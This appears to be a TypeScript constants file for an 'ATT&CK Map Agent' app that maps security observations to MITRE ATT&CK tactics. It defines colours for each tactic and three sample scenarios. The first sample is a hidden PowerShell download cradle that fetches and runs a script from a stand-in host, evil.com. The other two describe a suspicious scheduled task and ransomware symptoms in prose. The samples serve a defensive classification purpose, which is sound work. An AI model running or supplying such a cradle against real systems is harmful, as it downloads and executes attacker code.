import { ExampleScenario, Tactic } from "./types";

export const APP_NAME = "ATT&CK Map Agent";

export const TACTIC_COLORS: Record<string, string> = {
  [Tactic.Reconnaissance]: "bg-blue-900 text-blue-200 border-blue-700",
  [Tactic.ResourceDevelopment]: "bg-indigo-900 text-indigo-200 border-indigo-700",
  [Tactic.InitialAccess]: "bg-yellow-900 text-yellow-200 border-yellow-700",
  [Tactic.Execution]: "bg-red-900 text-red-200 border-red-700",
  [Tactic.Persistence]: "bg-purple-900 text-purple-200 border-purple-700",
  [Tactic.PrivilegeEscalation]: "bg-orange-900 text-orange-200 border-orange-700",
  [Tactic.DefenseEvasion]: "bg-gray-700 text-gray-200 border-gray-500",
  [Tactic.CredentialAccess]: "bg-pink-900 text-pink-200 border-pink-700",
  [Tactic.Discovery]: "bg-teal-900 text-teal-200 border-teal-700",
  [Tactic.LateralMovement]: "bg-cyan-900 text-cyan-200 border-cyan-700",
  [Tactic.Collection]: "bg-emerald-900 text-emerald-200 border-emerald-700",
  [Tactic.CommandAndControl]: "bg-lime-900 text-lime-200 border-lime-700",
  [Tactic.Exfiltration]: "bg-green-900 text-green-200 border-green-700",
  [Tactic.Impact]: "bg-rose-900 text-rose-200 border-rose-700",
};

export const EXAMPLES: ExampleScenario[] = [
  {
    id: "1",
    title: "PowerShell Download Cradle",
    content: "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://evil.com/payload.ps1'))\""
  },
  {
    id: "2",
    title: "Suspicious Scheduled Task",
    content: "A scheduled task was created named 'UpdateChecker' that executes a binary in C:\\Temp\\ running as NT AUTHORITY\\SYSTEM every 5 minutes."
  },
  {
    id: "3",
    title: "Ransomware Behavior",
    content: "User reports files being renamed with .locked extension. The system wallpaper has been changed to a ransom note. High volume of file writes detected in My Documents."
  }
];
